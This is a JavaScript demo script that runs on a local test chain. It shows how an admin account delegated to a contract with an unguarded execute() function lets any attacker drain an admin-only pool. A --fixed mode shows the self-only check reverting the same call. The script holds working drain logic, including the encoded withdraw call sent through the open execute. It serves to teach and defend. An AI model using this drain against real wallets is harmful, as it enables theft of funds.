// Attack #2: an admin EOA delegated to a contract whose execute() has no access control
// (the QNT / IPOR pattern). Anyone calls admin.execute(...) and the batch runs as the
// admin — so the admin-only pool withdraw passes.
//   node demos/02-execute.mjs           anyone drains the pool through the open execute
//   node demos/02-execute.mjs --fixed   execute requires msg.sender == address(this) → revert
import { encodeFunctionData } from "viem";
import { startChain, stopChain, deploy, roles, abis, delegate, codeOf, send, attempt,
  read, fmtQnt, short, parseEther } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "execute-fixed" : "execute", fixed ? "Open execute, fixed" : "Open execute");
await startChain();

const qnt = await deploy("qnt");
const pool = await deploy("pool", [qnt, roles.admin.address]); // only admin may withdraw
await send(roles.relayer, qnt, abis.qnt, "mint", [pool, parseEther("1988.5")]);

// The admin is an ordinary EOA. It delegates to a delegate contract (open vs self-only).
const delegateAddr = fixed ? await deploy("self") : await deploy("open");
const delegateAbi = fixed ? abis.self : abis.open;
t.say(`admin ${short(roles.admin.address)} is an EOA that controls a pool of tQNT`);
await delegate(roles.admin, delegateAddr);
t.note(`admin delegated to a ${fixed ? "self-only" : "no-access-control"} execute(): ${short(delegateAddr)}`);
t.note(`code at admin: ${(await codeOf(roles.admin.address)).slice(0, 10)}… · pool holds ${fmtQnt(await read(pool, abis.pool, "balance"))} tQNT`);

// The attacker (not the admin) calls admin.execute([ pool.withdraw(attacker, all) ]).
const poolBefore = await read(pool, abis.pool, "balance");
const drain = [{ to: pool, value: 0n, data: encodeFunctionData({ abi: abis.pool, functionName: "withdraw", args: [roles.attacker.address, poolBefore] }) }];
t.cmd(`attacker → admin.execute([ pool.withdraw(attacker, 1,988.5) ])`);
const r = await attempt(roles.attacker, roles.admin.address, delegateAbi, "execute", [drain]);
const poolLeft = await read(pool, abis.pool, "balance");
const stolen = await read(qnt, abis.qnt, "balanceOf", [roles.attacker.address]);
if (r.ok) t.bad(`  ✓ ran as the admin → attacker took ${fmtQnt(stolen)} tQNT`);
else t.ok(`  ✗ reverted: ${r.name}  (caller is not the account itself)`);

t.big(fixed ? `POOL SAFE: ${fmtQnt(poolLeft)} tQNT` : `pool ${fmtQnt(poolBefore)} → ${fmtQnt(poolLeft)} tQNT`);
t.save(); stopChain(); process.exit(0);
